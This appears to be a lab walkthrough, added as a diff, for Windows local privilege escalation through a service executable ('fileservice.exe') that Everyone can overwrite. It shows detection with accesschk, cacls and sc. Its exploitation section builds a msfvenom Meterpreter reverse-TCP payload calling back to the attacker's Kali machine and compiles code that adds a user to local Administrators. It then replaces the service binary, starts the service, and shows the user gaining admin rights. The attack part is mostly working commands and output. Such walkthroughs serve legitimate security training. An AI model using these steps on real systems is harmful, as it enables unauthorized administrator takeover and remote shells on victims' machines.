@@ -1,0 +1,146 @@
+Detection - Windows VM (target)
+--------------------------------
+
+1. Use the tool 'accesschk' and the command 'cacls' to display file permissions and information
+
+	C:\Temp\accesschk> accesschk64.exe -wvu "C:\Program Files\File Application Service\" -accepteula
+
+	Accesschk v6.10 - Reports effective permissions for securable objects
+	Copyright (C) 2006-2016 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+
+	C:\Program Files\File Application Service\fileservice.exe
+	  Medium Mandatory Level (Default) [No-Write-Up]
+	  RW Everyone
+		FILE_ALL_ACCESS
+	  RW NT AUTHORITY\SYSTEM
+		FILE_ALL_ACCESS
+	  RW BUILTIN\Administrators
+		FILE_ALL_ACCESS
+	  RW BUILTIN\Users
+		FILE_ALL_ACCESS
+
+
+	C:\Temp\accesschk> cacls "C:\Program Files\File Application Service" 
+	cacls "C:\Program Files\File Application Service" 
+	C:\Program Files\File Application Service NT SERVICE\TrustedInstaller:(ID)F 
+		                                  NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
+		                                  NT AUTHORITY\SYSTEM:(ID)F 
+		                                  NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
+		                                  BUILTIN\Administrators:(ID)F 
+		                                  BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
+		                                  BUILTIN\Users:(ID)R 
+		                                  BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
+
+		                                                                GENERIC_READ
+		                                                                GENERIC_EXECUTE
+	 
+		                                  CREATOR OWNER:(OI)(CI)(IO)(ID)F 
+		                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
+		                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
+
+		                                                                                                         GENERIC_READ
+		                                                                                                         GENERIC_EXECUTE
+
+	
+2. Notice that the group “Everyone” has “FILE_ALL_ACCESS” permission over the file "fileservice.exe".
+
+3. Check the permission of the service 'filepermsvc'
+
+	C:\Temp\accesschk> sc qc filepermsvc
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: filepermsvc
+		TYPE               : 10  WIN32_OWN_PROCESS 
+		START_TYPE         : 3   DEMAND_START
+		ERROR_CONTROL      : 1   NORMAL
+		BINARY_PATH_NAME   : "C:\Program Files\File Application Service\fileservice.exe"
+		LOAD_ORDER_GROUP   : 
+		TAG                : 0
+		DISPLAY_NAME       : File Application Service
+		DEPENDENCIES       : 
+		SERVICE_START_NAME : LocalSystem
+
+
+	C:\Temp\accesschk> accesschk64.exe -wuvc filepermsvc -accepteula 
+
+	Accesschk v6.10 - Reports effective permissions for securable objects
+	Copyright (C) 2006-2016 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+
+	filepermsvc
+	  Medium Mandatory Level (Default) [No-Write-Up]
+	  RW NT AUTHORITY\SYSTEM
+		SERVICE_ALL_ACCESS
+	  RW BUILTIN\Administrators
+		SERVICE_ALL_ACCESS
+
+
+Exploitation - Windows VM (target)
+-----------------------------------
+
+1. Create a malicious file named 'fileservice.exe' and copy it in ‘C:\Program Files\File Application Service\’.
+
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o fileservice.exe
+	
+	OR PoC -------------
+	
+	sudo apt-get install mingw-w64
+	x86_64-w64-mingw32-gcc windows_service.c -o program.exe		// system("cmd.exe /k whoami > c:\\windows\\temp\\pwned-fiston.txt");
+	x86_64-w64-mingw32-gcc windows_service.c -o program2.exe	// system("cmd.exe /k net localgroup administrators user /add");
+	
+	C:\Temp> copy /y "C:\Temp\program2.exe" "C:\Program Files\File Application Service\fileservice.exe"                      
+	copy /y "C:\Temp\program2.exe" "C:\Program Files\File Application Service\fileservice.exe"
+		1 file(s) copied.
+
+
+2. In command prompt type the following command to start the service 'filepermsvc' and become local admin
+		
+	C:\Temp> sc start filepermsvc
+	sc start filepermsvc
+
+	SERVICE_NAME: filepermsvc 
+		TYPE               : 10  WIN32_OWN_PROCESS  
+		STATE              : 2  START_PENDING 
+		                        (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+		WIN32_EXIT_CODE    : 0  (0x0)
+		SERVICE_EXIT_CODE  : 0  (0x0)
+		CHECKPOINT         : 0x0
+		WAIT_HINT          : 0x7d0
+		PID                : 1256
+		FLAGS              : 
+		
+		
+	C:\Temp> net user user
+	net user user
+	User name                    user
+	Full Name                    
+	Comment                      
+	User's comment               
+	Country/region code          000 (System Default)
+	Account active               Yes
+	Account expires              Never
+
+	Password last set            3/12/2020 3:52:30 AM
+	Password expires             4/23/2020 3:52:30 AM
+	Password changeable          3/12/2020 3:52:30 AM
+	Password required            Yes
+	User may change password     Yes
+
+	Workstations allowed         All
+	Logon script                 
+	User profile                 
+	Home directory               
+	Last logon                   3/26/2020 12:15:01 AM
+
+	Logon hours allowed          All
+
+	Local Group Memberships      *Administrators       *Remote Desktop Users 
+		                           *Users                
+	Global Group memberships     *None                 
+	The command completed successfully.
+
+copy /y "C:\Users\user\Desktop\fileservice.exe" "C:\Program Files\File Application Service\fileservice.exe" 
+
+
+
